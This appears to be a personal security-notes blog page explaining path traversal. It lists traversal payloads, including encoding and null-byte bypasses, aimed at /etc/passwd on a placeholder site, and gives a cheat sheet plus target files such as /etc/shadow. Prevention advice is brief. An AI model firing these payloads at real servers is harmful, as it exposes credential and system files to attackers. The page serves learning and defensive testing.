---
title: Path Traversal
published: 2025-05-15
description: 'Notes about path traversal vulnerability'
image: "guide/tanjiro.jpg"
tags: [server-side, web-vulns]
category: 'WebSec'
draft: false 
---

`Path traversal`, also known as `directory traversal`, is a vulnerability that allows an attacker to read arbitrary files on the server where the application is hosted. Reading can include:

```markdown
- Application data and code
- Credentials of back-end systems
- Sensitive operating system files
```

In some cases the attacker may also be able to write arbitrary files to the server.

### Where to look?
Every time a resource or file is included by the application, there is a risk that an attacker could include a remote file or resource in an unauthorized way.

### Examples

```markdown
https://insecure-vulnerable-website.com/loadFile?filename=

Simple case:
    ?filename=../../../etc/passwd

Absolute path:
    ?filename=/etc/passwd

Nested traversal sequences:
    ?filename=....//....//....//etc/passwd

Url encoding:
    ?filename=..%2f..%2f..%2fetc/passwd

Double URL encoding:
    ?filename=..%252f..%252f..%252fetc/passwd

Base folder followed by traversal sequences:
    ?filename=/var/www/images/../../../etc/passwd

Null byte bypass:
    ?filename=../../../etc/passwd%00.png
```

### Encoding, double encoding and percent encoding
:::note[Tips]
Diff types to encode
:::

```
%2e%2e%2f -> ../
%2e%2e/ -> ../
..%2f -> ../
%2e%2e%5c -> ..\
%2e%2e\ -> ..\
..%5c -> ..\
%252e%252e%255c -> ..\
..%255c -> ..\

..%c0%af -> ../
..%c1%9c -> ..\

%252%66 -> %2f -> /
%252%65 -> %2e -> .
%252f -> %2f -> /
%252e -> %2e -> .
```

### Files to read
Linux Files:

- /etc/passwd
- /etc/hosts
- /etc/shadow

Windows Files:

- C:/boot.ini
- C:/Windows/win.ini
- C:/WINNT/win.ini


### How to prevent PATH TRAVERSAL
The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way. 

### Youtube

<iframe width="100%" height="468" src="https://www.youtube.com/embed/99yJtmmtrJU" title="Directory Traversal Attacks Made Easy" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

### Resources

[OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
[Web Academy](https://portswigger.net/web-security/file-path-traversal#what-is-path-traversal)
[caon.io 🐐](https://caon.io/exploitation/vulnerability/pathtransversal/)
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)